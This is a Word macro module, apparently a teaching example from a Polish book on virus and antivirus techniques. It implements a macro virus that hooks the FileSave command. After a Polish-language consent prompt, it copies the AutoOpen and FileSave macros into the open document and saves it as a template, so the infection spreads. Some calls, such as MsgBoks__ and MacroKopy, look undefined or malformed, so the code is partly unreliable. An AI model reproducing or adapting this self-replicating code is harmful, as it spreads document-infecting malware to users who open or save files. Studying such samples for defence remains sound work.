   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Dim Tyt$
   Dim Uwg$
   Dim TiN
   Dim Prz
   Dim MacroKopy
   Dim Tek$
   WordBasic.FileSave
   On Error GoTo -1: On Error GoTo FileSave_Error
   Tyt$ = "Nowoczesne techniki wirusowe i antywirusowe, Autor Adam Blaszczyk"
   Uwg$ = "Czy chcesz zainfekowac '" + WordBasic.[WindowName$]() + "' makrowirusem ?"
   TiN = 256 + 48 + 4
   Prz = MsgBoks__(Uwg$, Tyt$, TiN)
   If (Prz = -1) Then
     MacroKopy "Globalne:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
     MacroKopy "Globalne:FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
     WordBasic.FileSaveAs Format:=1
     Tek$ = "Wirus dopisal sie do '" + WordBasic.[WindowName$]() + "'"
     WordBasic.MsgBox Tek$, Tyt$, 64
     WordBasic.FileSave
   End If
   Rem FileSave
   FileSave_Error:
   End Sub
